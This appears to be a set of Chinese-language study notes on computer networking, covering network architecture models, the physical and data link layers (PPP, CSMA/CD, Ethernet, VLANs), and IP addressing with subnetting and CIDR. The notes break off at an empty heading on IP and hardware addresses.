[TOC]

### 网络基础与物理层

#### ISP

互联网服务提供商 ISP 可以从互联网管理机构获得许多 **IP 地址**，同时拥有通信线路以及路由器等联网设备，个人或机构向 ISP 缴纳一定的费用就可以接入互联网。

<img src="assets/1563547521260.png" alt="1563547521260" style="zoom:50%;" />

目前的互联网是一种**多层次 ISP 结构**，ISP 根据覆盖面积的大小分为第一层 ISP、区域 ISP 和接入 ISP。互联网交换点 IXP 允许两个 ISP 直接相连而不用经过第三个 ISP。

<img src="assets/1563547543511.png" alt="1563547543511" style="zoom:67%;" />

---

#### 主机之间的通信方式

- 客户-服务器模式（**C/S**）：客户是服务的请求方，服务器是服务的提供方。

<img src="assets/1563547573055.png" alt="1563547573055" style="zoom: 60%;" />

- 对等模式（**P2P**）：不区分客户和服务器。

<img src="assets/1563547590554.png" alt="1563547590554" style="zoom: 50%;" />

-----

#### 计算机网络体系结构

<img src="assets/1536486064767.png"/>

##### 1. OSI七层协议

七层协议。其中表示层和会话层用途如下：

-  **表示层** ：数据压缩、加密以及数据描述，这使得应用程序不必关心在各台主机中数据内部格式不同的问题。

-  **会话层** ：建立及管理会话。

OSI 七层协议示意图：

![七层体系结构图](assets/七层体系结构图.png)

##### 2. 五层协议(多用)

五层协议**没有表示层和会话层**，而是将这些功能留给应用程序开发者处理。

-  **物理层** ：考虑的是怎样在传输媒体上**传输数据比特流**，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。
-  **数据链路层** ：网络层针对的还是**主机之间的数据传输**服务，而主机之间可以有很多链路，链路层协议就是为同一链路的主机提供数据传输服务。数据链路层把网络层传下来的分组封装成帧。链路层协议有 **PPP 协议、CSMA/CD 协议**等。
-  **网络层** ：**为==主机==提供数据传输服务**。传输层协议是为主机中的**进程**提供数据传输服务。网络层把传输层传递下来的报文段或者用户数据报封装成分组。在计算机网络中进行通信的两个计算机之间可能会经过很多个数据链路，也可能还要经过很多通信子网。网络层的任务就是选择合适的网间路由和交换结点， 确保数据及时传送。网络层协议主要有 **IP 协议，ARP 协议**等。
-  **传输层** ：**为==进程==提供通用数据传输服务**。由于应用层协议很多，定义通用的传输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：传输控制协议 **TCP**，提供面向连接、可靠的数据传输服务，数据单位为报文段；用户数据报协议 **UDP**，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。TCP 主要提供**完整性**服务，UDP 主要提供**及时性**服务。
-  **应用层** ：为特定应用程序提供数据传输服务，例如 **HTTP、DNS 等协议**。数据单位为**报文**。

##### 3. TCP/IP

它只有**四层**，相当于五层协议中数据链路层和物理层合并为**网络接口层**。TCP/IP 体系结构不严格遵循 OSI 分层概念，应用层可能会直接使用 IP 层或者网络接口层。

<img src="assets/image-20191214202550766.png" alt="image-20191214202550766" style="zoom:67%;" />

##### 4. 数据在各层之间的传递过程

在**向下**的过程中，需要**添加**下层协议所需要的**首部或者尾部**，而在**向上**的过程中不断**拆开**首部和尾部。



#### 物理层

物理层放这里略讲。

##### 1. 通信方式

根据信息在传输线上的传送方向，分为以下三种通信方式：

- 单工通信：单向传输
- 半双工通信：双向交替传输
- 全双工通信：双向同时传输

##### 2. 带通调制

模拟信号是连续的信号，数字信号是离散的信号。带通调制把数字信号转换为模拟信号。

##### 3. 电路交换与分组交换

###### (1) 电路交换

**电路交换**用于电话通信系统，两个用户要通信之前需要建立一条专用的物理链路，并且在整个通信过程中始终占用该链路。由于通信的过程中不可能一直在使用传输线路，因此电路交换对线路的利用率很低，往往不到 10%。

###### (2) 分组交换

每个分组都有首部和尾部，包含了源地址和目的地址等控制信息，在同一个传输线路上同时传输多个分组互相不会影响，因此在同一条传输线路上允许同时传输多个分组，也就是说分组交换不需要占用传输线路。

在一个邮局通信系统中，邮局收到一份邮件之后，先存储下来，然后把相同目的地的邮件一起转发到下一个目的地，这个过程就是存储转发过程，分组交换也使用了存储转发过程。

##### 4. 时延

总时延 = 排队时延 + 处理时延 + 传输时延 + 传播时延。

<img src="assets/1563547613598.png" alt="1563547613598" style="zoom:60%;" />

###### (1) 排队时延

分组在路由器的输入队列和输出队列中排队等待的时间，取决于网络当前的通信量。

###### (2) 处理时延

主机或路由器收到分组时进行处理所需要的时间，例如分析首部、从分组中提取数据、进行差错检验或查找适当的路由等。

###### (3) 传输时延

主机或路由器传输数据帧所需要的时间。

<img src="assets/1563547628872.png" alt="1563547628872" style="zoom:50%;" />

其中 l 表示数据帧的长度，v 表示传输速率。

###### (4) 传播时延

电磁波在信道中传播所需要花费的时间，电磁波传播的速度接近光速。

<img src="assets/1563547646311.png" alt="1563547646311" style="zoom:50%;" />

其中 l 表示信道长度，v 表示电磁波在信道上的传播速度。



### 数据链路层

#### 概述

数据链路层的协议数据单元：**帧**。

数据链路层**作用**：将**网络层**交下来的数据报（分组）封**装成帧发送到链路**上，同时也可以取出接收到的帧中的数据交给网络层。

数据链路层像个**数字管道**。常常在两个对等的数据链路层之间画出一个数字管道，而在这条**数字管道**上传输的数据单位是**帧**。数据链路层不必考虑物理层如何实现比特传输的细节。甚至还可以更简单地设想好像是沿着两个数据链路层之间的水平方向把帧直接发送到对方。

<img src="assets/image-20191219204451010.png" alt="image-20191219204451010" style="zoom:45%;" />

#### 信道分类

信道有两种类型：

<img src="assets/image-20191219204335823.png" alt="image-20191219204335823" style="zoom:50%;" />

##### 1. 点对点信道

点对点信道是**一对一通信**。因为**不会发生碰撞**，因此也比较简单，使用 **PPP 协议**进行控制。

点对点信道通信流程：

- 结点 A 的数据链路层把**网络层**交下来的 IP 数据报**添加首部和尾部封装成帧**。

- 结点 A 把封装好的**帧**发给结点 **B** 的数据链路层。

- 若结点 B 的数据链路层收到的**帧无差错**，则从收到的帧中提取出 IP 数据报**上交**给网络层；否则丢弃这个帧（重发工作由上层完成，此处只确保无错传输）。

##### 2. 广播信道

广播信道是**一对多通信**，一个节点发送的数据能够被广播信道上**所有**的节点接收到。所有的节点都在同一个广播信道上发送数据，因此需要有专门的控制方法进行协调，避免发生冲突（冲突也叫碰撞）。

主要有两种控制方法进行协调，一个是使用**信道复用**技术，一是使用 **CSMA/CD** 协议。



-----------------------------------------------------------------------------------------------------------------------------------------------------------

**==以下是使用点对点信道的数据链路层分析==**

-----------------------------------------------------------------------------------------------------------------------------------------------------------



#### 点对点信道三个基本问题

##### 1. 封装成帧

将网络层传下来的分组添加**首部和尾部**，用于**标记帧的开始和结束**。各种数据链路层协议对首部与尾部的格式都有明确的规定，**首部与尾部**的作用就是**帧定界**。控制字符 SOH 放在帧的最前面，控制字符 EOT 放在帧的最后面。

<img src="assets/image-20191219204616660.png" alt="image-20191219204616660" style="zoom:50%;" />

**MTU：最大传送单元**---即帧的数据部分的长度上限。

##### 2. 透明传输

透明表示一个实际存在的事物看起来好像不存在一样。

帧使用首部和尾部进行**定界**，如果帧的**数据部分**含有和**首部尾部**相同的内容，**那么帧的开始与结束位置就会被错误的判定**。如下图所示。

<img src="assets/image-20191219204647590.png" alt="image-20191219204647590" style="zoom:50%;" />

可以用“**字节填充法”**解决透明传输的问题。即在**数据部分**出现首部尾部**相同的内容**前面插入**转义字符**，这种方法称为**字符填充**。如果数据部分出现转义字符，那么就在转义字符前面再加个转义字符。在接收端进行处理之后可以**还原**出原始数据。这个过程透明传输的内容是转义字符，用户察觉不到转义字符的存在。

<img src="assets/image-20191219204706661.png" alt="image-20191219204706661" style="zoom:50%;" />

##### 3. 差错检测

目前数据链路层广泛使用了**循环冗余检验**（CRC）来检查比特差错，这里所说的“差错”是“比特差错”，1 可能会变成 0 而 0 也可能变成 1。

在一段时间内，**传输错误的比特**占所传输**比特总数**的比率称为**误码率** BER (Bit Error Rate)。 **误码率**与**信噪比**有很大的关系。 为了保证数据传输的可靠性，在计算机网络传输数据时，必须采用各种差错检测措施。在数据后面添加上的**冗余码**称为**帧检验序列 FCS** (Frame Check Sequence)。

Tips: 在数据链路层使用 **CRC 检验**仅能够实现**无比特差错**的传输，也就是保证接收到的数据是**无比特差错**的，但这**不能保证可靠传输**(还需加入确认和重传的机制以防止**帧丢失**、**帧重复和帧失序**)。



#### PPP协议

**用处**：互联网用户通常需要连接到某个 **ISP** 之后才能接入到互联网，PPP 协议是**用户计算机和 ISP 进行通信**时所使用的数据链路层协议。

<img src="assets/image-20191219204822775.png" alt="image-20191219204822775" style="zoom:47%;" />

#####  1. PPP协议的特点

- **简单、封装成帧、透明性**、多种网络层协议，能够在同一条物理链路上同时支持多种网络层协议。
- 多种类型链路，能够在多种类型的链路上运行。
- **差错检测**，能够对接收端收到的帧进行检测，并立即丢弃有差错的帧。
- 检测连接状态，能够及时自动检测出链路是否处于正常工作状态。
- **最大传送单元**，必须对每一种类型的点对点链路设置最大传送单元 MTU 的标准默认值，促进各种实现之间的互操作性 。
- 网络层地址协商，必须提供一种机制使通信的两个网络层实体能够通过协商知道或能够配置彼此的网络层地址。 
- 数据压缩协商，必须提供一种方法来协商使用数据压缩算法。

##### 2. PPP协议的组成

- 一个将 **IP 数据报封装到串行链路**的方法（PPP 帧格式）。

- 链路控制协议 **LCP** (Link Control Protocol)。 
- 网络控制协议 **NCP** (Network Control Protocol)。 

##### 3. PPP协议帧格式

PPP 协议**面向字节**的，所有 PPP 帧的长度都是整数字节。 

PPP 帧的**首部和尾部**分别为 4 个字段和 2 个字段。标志字段 F = 0X7E（帧的定界符），地址字段A = 0xFF，控制字段通常  = 0x003，协议字段为 2 个字节：若为 0x0021，则信息字段就是 **IP 数据报**。 若为 0x8021，则信息字段是**网络控制数据**。 若为 0xC021，则信息字段是 **PPP 链路控制数据**。 若为 0xC023，则信息字段是**鉴别数据**。尾部的第一个字段（2个字节）是使用 CRC 的**帧检验序列**。

<img src="assets/image-20191219204848387.png" alt="image-20191219204848387" style="zoom:45%;" />

> 问题：在PPP协议中，透明传输中信息字段和标志字段的**比特组合一样**，又该如何处理呢？

这要分情况讨论，(1) 当 PPP 使用**异步传输**时，就要使用一种特殊的**字节填充法**（规定转义符定义为 0x7E）：将信息字段中出现的每一个 0x7E 字节转变成为 2 字节序列 (0x7D, 0x5E)。 若信息字段中出现一个 0x7D 的字节, 则将其转变成为 2 字节序列 (0x7D, 0x5D)。 若信息字段中出现 ASCII 码的控制字符（即数值小于 0x20 的字符），则在该字符前面要加入一个 0x7D 字节，同时将该字符的编码加以改变。(2) 当 PPP 使用**同步传输**时（用在SONET/SDH链路），就要采用**零比特填充法**来实现透明传输：在发送端，只要发现有 **5 个连续 1**，则立即**填入一个 0**。 接收端对帧中的比特流进行扫描。每当发现 5 个连续1时，就把这 5 个连续 1 后的**一个 0 删除**。

##### 4. PPP协议工作流程

PPP 协议的用处：用户使用拨号电话线接入互联网时， **用户计算机和 ISP 进行通信**时所使用的**数据链路层**协议就是 PPP 协议，看看到底是怎么在用户计算机和 ISP 之间**建立通信连接**的。

当**用户拨号接入 ISP** 时，路由器的调制解调器对拨号做出确认，并建立一条**物理连接**。 PC 机向路由器发送一系列的 **LCP 分组**（封装成多个 PPP 帧）。 这些分组及其响应选择一些 PPP 参数，并进行网络层配置，**NCP** 给新接入的 PC 机分配一个**临时的 IP 地址**，使 PC 机成为因特网上的一个主机。 通信完毕时，NCP 释放网络层连接，收回原来分配出去的 IP 地址。接着 LCP 释放数据链路层连接。最后释放的是物理层的连接。

<img src="assets/image-20191219204918116.png" alt="image-20191219204918116" style="zoom:45%;" />

 Tip: 由此可见 PPP 协议已不是纯粹的数据链路层的协议，它还包含了**物理层**和**网络层**的内容。 



-----------------------------------------------------------------------------------------------------------------------------------------------------------

**==以下是使用广播信道的数据链路层分析==**

-----------------------------------------------------------------------------------------------------------------------------------------------------------



**广播信道**可以进行**一对多**的通信，而==**局域网**使用的就是**广播信道**==，局域网技术非常重要，所以看看**局域网**的数据链路层。 

#### 局域网的数据链路层

##### 1. 局域网

局域网的**特点**：网络为一个**单位**所拥有，且**地理范围**和站点数目均**有限**。

**局域网的优点**：具有**广播功能**，从一个站点可很方便地访问全网。局域网上的主机可**共享**连接在局域网上的**各种硬件**和**软件资源**。 便于系统的扩展和逐渐地演变，各设备的位置可灵活调整和改变。 提高了系统的可靠性、可用性和残存性。

**局域网的分类**：按照网络拓扑分为**星形网**、**环形网**和**总线网**。

<img src="assets/image-20191219204938846.png" alt="image-20191219204938846" style="zoom:50%;" />

**注意**：局域网的工作层次跨越了==**数据链路层和物理层**==，但是技术多包含在数据链路层，所以这里讨论的是数据链路层中的局域网技术。 

为了使用户能够**共享资源**，就要考虑怎么**划分信道**，方式可以有 (1) **静态划分信道**：频分复用、时分复用、波分复用、码分复用等。(2) **动态媒体接入控制**(多点接入)：**随机接入**、受控接入，如多点线路探询 (polling)，或轮询等。

这里重点讨论**随机接入**方式：**所有的用户可以随机的发送信息**，但如果恰巧有两个或更多的用户在**同一时刻**发送信息，那么在共享媒体上就要产生**碰撞**，为此必须有**解决碰撞**的网络协议，即下述的 **CSMA/CD** 协议。 

##### 2. CSMA/CD协议

CSMA/CD 表示**载波监听多点接入 / 碰撞检测**。协议主要实现：

-  **多点接入** ：说明这是**总线型**网络，即许多主机以**多点**的方式连接到总线上。
-  **载波监听** ：**每个主机**都必须不停地**监听信道**。在发送前，如果监听到信道正在使用就必须**等待**。
-  **碰撞检测** ：在发送中，如果监听到信道已有其它主机正在发送数据，就表示发生了**碰撞**。虽然每个主机在发送数据之前都已经监听到信道为**空闲**，但是由于电磁波的传播时延的存在，还是有**可能会发生碰撞**。

因此 CSMA/CD 要做的概括起来就是“**先听后发，边听边发，冲突停止，延迟重发**”。 

Tips: 在使用 CSMA/CD 协议时，一个站不可能同时进行发送和接受（但必须边发送边监听信道），所以使用 CSMA/CD 的以太网进行的是**双向交替通信**（半双工通信） 。

当发生碰撞时，主机要停止发送，**等待一段时间**再发送。这个时间采用  **截断二进制指数退避算法**  来确定。从离散的整数集合 {0, 1, .., (2<sup>k</sup>-1)} 中随机取出一个数，记作 r，然后取 r 倍的争用期作为**重传等待**时间。

<img src="assets/image-20191219205046604.png" alt="image-20191219205046604" style="zoom:50%;" />

##### 3. 网络适配器

**网络适配器** (adapter) 又称网络接口卡 **NIC** (Network Interface Card)，或“**网卡**”。

适配器的**重要功能**： **进行串行/并行转换**、**对数据进行缓存、数据的封装与解封、链路管理、**在计算机的操作系统安装设备驱动程序、 实现以太网协议。

当**适配器**收到正确的**帧**时，它就使用中断来通知计算机，并交付给**协议栈**中的**网络层**。当计算机要发送 IP 数据报时，就由协议栈把 IP 数据报向下交给适配器，组成**帧**后发送到**局域网**中。

<img src="assets/image-20191219205010925.png" alt="image-20191219205010925" style="zoom:45%;" />

##### 4. MAC地址

MAC 地址是固化在**网络适配器**的 **ROM** 中的，所以又叫**硬件地址**或**物理地址**。 **MAC 地址**是**==链路层地址==**，长度为 6 字节（48 位），用于唯一标识**网络适配器**（网卡）。其组成结构如下：

- 3 字节共 24 位：**组织唯一**标识符
- 3 字节共 24 位：**扩展唯一**标识符

一台主机拥有多少个网络适配器就有多少个 MAC 地址。例如笔记本电脑普遍存在无线网络适配器和有线网络适配器，因此就有两个 MAC 地址。

**适配器**从网络上每收到一个 **MAC 帧**就首先用硬件检查 **MAC 帧**中的 **MAC 地址**。 如果是发往本主机的帧则**收下**，然后上交给网络层进行处理。 否则就将此帧**丢弃**，不再进行其他的处理。 "发往本主机的帧" 包括以下三种帧： **单播 (unicast) 帧**（一对一） **广播 (broadcast) 帧**（一对全体） **多播 (multicast) 帧**（一对多） 。



#### 以太网

##### 1. 以太网概述

**以太网**是一种**星型拓扑**结构的**局域网**。早期使用**集线器**进行连接，但是已经被淘汰了。目前以太网使用**交换机**替代了集线器，交换机是一种**链路层设备**，它**不会发生碰撞**，能根据 **MAC 地址**进行存储转发。

**以太网帧**格式：

-  **类型** ：标记上层使用的**协议**；
-  **数据** ：长度在 46-1500 之间，如果太小则需要填充；
-  **FCS** ：帧检验序列，使用的是 **CRC** 检验方法；

<img src="assets/image-20191219205659633.png" alt="image-20191219205659633" style="zoom:50%;" />

##### 2. 交换机与以太网拓展

###### (1) 物理层拓展以太网

使用集线器，已经退出市场。

###### (2) 数据链路层拓展以太网

使用**交换机**。为了提高以太网的覆盖范围就需要扩展以太网，而最常用的方法就是在数据链路层扩展。早期使用**网桥**，现在使用**以太网交换机**。

**以太网交换机的特点**：本质上就是一个**多接口的网桥**。每个接口都直接与一个单台主机或另一个以太网交换机相连，并且一般都使用**全双工方式**。以太网交换机具有**并行性**（能够同时连通多对接口，使多对主机能同时通信），所以相互通信的主机都是独占传输媒体，无碰撞地传输数据。以太网交换机的接口有**存储器**，能在输出端口繁忙时把到来的**帧进行缓存**。 以太网交换机是一种**即插即用设备**，其内部的**帧交换表**（又称为**地址表**）是通过**自学习算法**自动地逐渐建立起来的。 以太网交换机使用了专用的交换结构芯片，用硬件转发，其转发速率要比使用软件转发的网桥快很多。

**以太网交换机的优点**：**用户独享带宽，增加了总容量**；从共享总线以太网转到交换式以太网时，所有接入设备的软件和硬件、适配器等都**不需要做任何改动**；有**多种速率的接口**，方便各种不同情况的用户。

**以太网交换机的交换方式**：大多对收到的帧采取**存储转发**的方式，少数采用直通的方式。

**以太网交换机的自学习**：查找**交换表**中与收到帧的**源地址**有无相匹配的项目。 如没有就在交换表中增加一个项目（源地址、进入的接口和有效时间）。 如有则把原有的项目进行更新（进入的接口或有效时间）。交换机具有**自学习**能力，学习的是==**交换表的内容，交换表中存储着 MAC 地址到接口的映射**==。正是由于这种自学习能力，因此交换机是一种**即插即用**设备，不需要网络管理员手动配置交换表内容。

下图中，交换机有 **4 个接口**，主机 A 向主机 B 发送数据帧时，交换机把主机 A 到接口 1 的**映射**写入交换表中。为了发送数据帧到 B，先查交换表，此时没有主机 B 的表项，那么主机 A 就发送**广播帧**，主机 C 和主机 D 会丢弃该帧，主机 B **回应**该帧向主机 A 发送数据包时，交换机**查找**交换表得到主机 A 映射的接口为 1，就发送数据帧到接口 1，同时交换机**添加**主机 B 到接口 2 的**映射**。

<img src="assets/1563548036004.png" alt="1563548036004" style="zoom:70%;" />

**以太网的转发帧流程**：查找交换表中与收到帧的**目的地址**有无相匹配的项目。 如没有则向**所有其他接口**（进入的接口除外）**转发**。 如有则按交换表中给出的接口进行转发。 若交换表中给出的接口就是该帧进入交换机的接口，则应丢弃这个帧（因为这时不需要经过交换机进行转发）。

现在**以太网交换机**的**星形结构**是以太网的**首选拓扑**。 **总线以太网**使用 **CSMA/CD 协议**，以半双工方式工作。而**以太网交**换机**不使用共享总线**，==**没有碰撞**==问题，因此**==不使用 CSMA/CD 协议==**，而是以**全双工方式工作**。但仍然**采用以太网的帧结构**。

##### 3. 虚拟局域网

虚拟局域网可以建立与**物理位置无关**的逻辑组，只有在**同一个虚拟局域网**中的成员才会收到链路层**广播信息**。

例如下图中 (A1, A2, A3, A4) 属于一个虚拟局域网，A1 发送的广播会被 A2、A3、A4 收到，而其它站点收不到。

使用 VLAN 干线连接来建立虚拟局域网，每台交换机上的一个特殊接口被设置为干线接口，以互连 VLAN 交换机。IEEE 定义了一种扩展的以太网帧格式 802.1Q，它在标准以太网帧上加进了 4 字节首部 VLAN 标签，用于表示该帧属于哪一个虚拟局域网。

<img src="assets/1563548061264.png" alt="1563548061264" style="zoom:70%;" />







### 网络层

#### 概述

网络层是整个互联网的核心，因此应当让网络层尽可能**简单**。

 **TCP/IP** 体系中的**网络层**向上只提供**简单灵活的**、**无连接**的、**尽最大努力交付**的**数据报服务**。网络层不提供服务质量的承诺，不保证分组交付的时限，所传送的分组**可能出错**、丢失、重复、和失序。 

使用 IP 协议，可以把**异构**的物理网络连接起来，使得在网络层看起来好像是一个**统一的网络**。

<img src="assets/image-20191219213854273.png" alt="image-20191219213854273" style="zoom:45%;" />

#### 网际协议IP

网际层 IP 协议及其配套协议如下图所示。

<img src="assets/image-20191214211223955.png" alt="image-20191214211223955" style="zoom:45%;" />

与 **IP 协议**配套使用的还有三个协议：

- **地址解析协议 ARP**（Address Resolution Protocol）
- **网际控制报文协议 ICMP**（Internet Control Message Protocol）
- **网际组管理协议 IGMP**（Internet Group Management Protocol）

##### 1. 虚拟互联网络

**虚拟互连网络**也就是逻辑互连网络，它是指互连起来的各种物理网络的**异构性**本来是客观存在的，但是利用**IP协议**就可以使这些性能各异的网从**用户看起来**就是**一个统一的网络**。使用 IP 协议的虚拟互连网络可简称为 **IP 网**。

**好处**是：当互连网上的主机进行通信时，就好像在一个网络上通信，而看不见互连的各具体**网络异构**的细节。现在的互联网（Internet）就是在这种覆盖全球的 IP 网的上层使用 TCP 协议。

需要使用一些**中间设备**来使**异构的网络互相连接**起来，**4 种中间设备**：

- **物理层**中继系统：**转发器**，它是最简单的互联设备，它没有"智能"，不能控制和分析信息，也不具备网络管理功能，只是简单地接受数据帧，然后把数据发往更远的网络结点，因此转发器只能用于同种网络的物理层上。

- **数据链路层**中继系统：**以太网交换机**，交换机能同时连通许多对的端口，使每一对相互通信的主机都能像独占通信媒体那样，进行无冲突地传输数据。

- **网络层**中继系统：**路由器**。路由器只涉及到物理场、数据链路层和网络层等**三层**。网桥和路由器的混合物：**桥路器**（brouter）。**同一网络**内部发送IP 数据报可以进行**直接交付**，**不需要经过路由器**。不同网络之间需要通过路由器进行间接交付。

- **网络层以上**的中继系统：**网关**（gateway）。

**网络互连**都是用**路由器**进行**网络互连**和**路由选择**。由于历史的原因，许多有关 TCP/IP 的文献将网络层使用的**路由器**称为**网关**。

##### 2. IP地址的编址方式

IP  地址的编址方式经历了三个历史**阶段**：

- 基础分类
- 子网划分
- 无分类

###### (1) 基础分类

将 IP 地址划分为若干个**固定类**。 每一类地址都由**两个**固定长度的字段组成，其中一个字段是**==网络号== net-id**，它标志主机（或路由器）所连接到的**网络**。而另一个字段则是**==主机号== host-id**，它标志该**主机**（或路由器）, 主机号在它前面的**网络号**所指明的网络范围内必须是==**唯一**==的。 由此可见，一个 IP 地址在整个互联网范围内是唯一的。

这种**两级的 IP 地址结构**如下，共 4 字节 32 位：

<img src="assets/image-20191219213912688.png" alt="image-20191219213912688" style="zoom:40%;" />

 可以记为： 

> **IP地址 ::= {<网络号>, <主机号>}**

 各类 IP 地址的网络号字段和主机号字段如下： 

<img src="assets/image-20191219213951481.png" alt="image-20191219213951481" style="zoom:50%;" />

**A 类、B 类、C 类**地址**网络号（net-id）**字段分别是 1 个、2 个、3 个**字节长**。由于 IP 共 4 个字节，所以 A 类、B 类、C 类地址**主机**号（host-id）**，分别是 3 个、2 个、1 个字节长。**而在**网络号字段**的最前面有 **1-3 位**固定的**类别号**，分别为 **==0,  10, 110==**。

**D 类**地址（前 4 位是 1110）用于**多播**（一对多通信）。E 类地址（前 4 位是 1111）保留以后用。

**IP地址的指派范围**： 

<img src="assets/image-20191214210350028.png" alt="image-20191214210350028" style="zoom:55%;" />

 一般不使用的**特殊** IP 地址： 

<img src="assets/image-20191214210451221.png" alt="image-20191214210451221" style="zoom:50%;" />

Tips: 主机号**全 0**，代表这个网络的**网络地址**，**主机号全 1 代表广播地址**。

**二级IP地址**及其组成网络的重要特点： 

- IP 地址是一种**分等级**的地址结构 。
- 实际上 IP 地址是标志一个**主机**（或路由器）和一条**链路**的**接口**（所以**一个路由器**至少应当有**两个不同的IP地址**，在不同的网络中都有一个 IP 地址）。
- 用**转发器**或网桥连接起来的若干个局域网**仍为一个网络**（**网络号** net-id **相同**）。
- 互联网**平等对待每一个IP地址**。
- 不同**网络号**的**局域网**必须使用**路由器**进行互连。
- 同一个**局域网**上的主机或路由器的 IP 地址中的**网络号必须是一样**的。

###### (2) 子网划分

 为什么要划分子网？因为传统的**二级 IP 地**址**缺点**太多： 

- IP 地址空间的**利用率有时很低**。

- 给**每一个物理网络分配一个网络号**会使**路由表变得太大**因而使网络性能变坏。

- 两级的 IP 地址**不够灵活**。 

通过在**==主机号==**字段中拿一部分作为**子网号**，把两级 IP 地址划分为**三级 IP** 地址。

<img src="assets/image-20191219214152670.png" alt="image-20191219214152670" style="zoom:50%;" />

可以表示为：

> **IP地址 ::= {<网络号>, <子网号>, <主机号>}**

**划分子网的基本思路与原理**：划分子网纯属**一个单位内部**的事情，这个单位对外仍然表现为**没有**划分子网的网络。 从主机号**借用若干个位**作为**子网号 subnet-id**，而主机号也就相应**减少**了若干个位。凡是从其他网络发送给本单位某个主机的 IP 数据报，仍然是根据 IP 数据报中的**目的网络号**先找到连接在本单位网络上的**路由器**；然后此路由器在收到 IP 数据报后，再按目的**网络号**和**子网号**找到**目的子网**；**最后**就将 IP 数据报直接交付给目的**主机**。 

划分子网的**例子**：将一个 B 类 IP 划分成 **3 个**子网，划分成三个子网后对外仍是一个网络，外部网络看不到子网的存在。

<img src="assets/image-20191219214211532.png" alt="image-20191219214211532" style="zoom:56%;" />

特点：划分子网后 IP 地址就变成了**三级结构**。 划分子网只是把 IP 地址的**主机号**这部分进行再划分，而**不改变 IP 地址原来的网络号**。减少了 IP 地址的浪费且使网络的组织更加灵活，更便于维护和管理。 划分子网增加了灵活性，但是**减少了**能够连接在网络中的**主机总数**。

**子网掩码**

```
问题：假定有一个数据报（目的地址是145.13.3.10）已经到达了路由器R1,那么这个路由器如何把它转发到一个子网145.13.3.0呢？ 
```

IP 数据报的首部并没有给出源或目的主机所在的网络是否划分了子网以及子网的信息，因此需要使用**子网掩码（subnet mask）**就可以**找出** IP 地址中的**子网部分**。

**路由器在和相邻路由器交换路由信息时，必须把自己所在网络（或子网）的==子网掩码==告诉相邻路由器**。 路由器的**路由表中**的每一个项目，除了要给出**目的网络地址**外，还必须同时给出该**网络的子网掩码（没有划分就是默认子网的掩码）**。 若一个**路由器**连接在**两个子网**上就拥有**两个网络地址和两个子网掩码**。

**规则**：子网掩码的长度还是为 **32 位**。**==某位 ＝ 1==：IP地址中的对应位为==网络号和子网号==**，**==某位 ＝ 0==：IP 地址中的对应位为==主机号==**。子网掩码最好使用连续的 1（避免出错）。

现在可以通过该子网的**子网掩码**（255.255.255.0）来**找到子网** 145.13.3.0，**子网是根据子网掩码来划分的**。该路由器子网的子网掩码划分如下图：

<img src="assets/image-20191219214136620.png" alt="image-20191219214136620" style="zoom:50%;" />

重要的结论：**==(IP 地址)  & (子网掩码)  = 网络地址==**。 

注：同样的 IP 地址和不同的子网掩码也可以得出相同的**网络**地址。

A，B，C 类 IP 的**默认**子网掩码如下： 

<img src="assets/image-20191219214345960.png" alt="image-20191219214345960" style="zoom:50%;" />

一个 **B 类地址**的默认子网掩码为 **255.255.0.0**，如果 B 类地址的**子网占两个比特**，那么子网掩码为 11111111 11111111 11000000 00000000，也就是 255.255.192.0。

子网的划分分为**固定长度和变长子网**，使用固定长度子网时，所划分的所有子网的子网掩码都是相同的。划分子网增加了灵活性，但却**减少**了能够连接在网络上的**主机总数**。随着无分类域间路由选择 **CIDR** 的广泛使用，现在全 1 和全 0 的子网号也可以使用了，但一定要谨慎使用，确认路由器所用的路由选择软件是否支持全 0 或全 1 的子网号这种较新的用法。

###### (3) **无分类编址CIDR**

用于**构建超网**。

历程：1987 年，RFC 1009 就指明了在一个划分子网的网络中可同时使用**几个不同的子网掩码**，使用**变长子网掩码** **VLSM**(Variable Length Subnet Mask) 可进一步提高 IP 地址资源的利用率。 在 VLSM 的基础上又进一步研究出**无分类编址**方法，它的正式名字是**无分类域间路由选择 CIDR** (Classless Inter-Domain Routing)。 

**无分类编址 CIDR** 消除了传统 A 类、B 类和 C 类地址以及划分子网的概念，使用**==网络前缀和主机号==**来对 IP 地址进行编码，网络前缀的长度可以根据需要变化。

<img src="assets/image-20191219214521167.png" alt="image-20191219214521167" style="zoom:45%;" />

可以表示为：

> **IP 地址 ::= {< 网络前缀号 >, < 主机号 >}**

CIDR 的记法上采用在 **IP 地址**后面加上**==网络前缀长度==**的方法，例如 128.14.35.7/**20** 表示**前 20 位为网络前缀**  （这个数值**对应于三级编址中==子网掩码中 1 的个数==**） 。CIDR 的地址掩码可以继续称为子网掩码，子网掩码**首 1 长度为网络前缀的长度**。

**CDIR 地址块**：CIDR 把**网络前缀都相同**的连续的 **IP 地址**组成“**CIDR 地址块**”。**只要知道 CIDR 地址块中的任何一个地址，就可以知道该地址块的最小地址、最大地址、地址数。**如：128.14.32.0/20 表示的地址块共有 212 个地址（因为斜线后面的 20 是网络前缀的位数，所以这个地址的**主机号是 12 位**），最小地址 128.14.32.0 最大地址 128.14.47.255。 

一个 CIDR 地址块中有很多地址，一个 CIDR 表示的网络就可以表示原来的**很多个网络**，并且在路由表中只需要**一个路由**就可以代替原来的多个路由，**减少了路由表项**的数量。把这种通过使用**网络前缀**来减少路由表项的方式称为**路由聚合**（可理解为把多个网络聚合在了一起），也称为**构成超网** 。**路由聚合有利于减少路由器之间的路由选择信息的交换**，从而提高了整个互联网的性能。 

在路由表中的项目由“**网络前缀**”和“**下一跳地址**”组成，在查找时可能会得到不止一个匹配结果 (之所以会有多个结果，是因为地址块又划分了地址块，如 ISP 给大学地址块，大学给院系划分地址块) ，应当采用**最长前缀**匹配来确定应该匹配哪一个。 因为**网络前缀越长，其地址块就越小，因而路由就越具体 (more specific)** 。

常用的 CIDR 地址块：

<img src="assets/image-20191214210823656.png" alt="image-20191214210823656" style="zoom:52%;" />

划分举例：

这个 ISP 共有 64 个 **C 类**网络。如果不采用 CIDR 技术，则在与该 ISP 的路由器交换路由信息的每一个**路由器的路由表**中，就需要有 64 个项目。但采用**地址聚合**后，只需用路由聚合后的 **1 个项目** 206.0.64.0/18 就能找到该 ISP。 

![image-20191214211037622](assets/image-20191214211037622.png)

##### 3. IP地址与硬件地址的联系

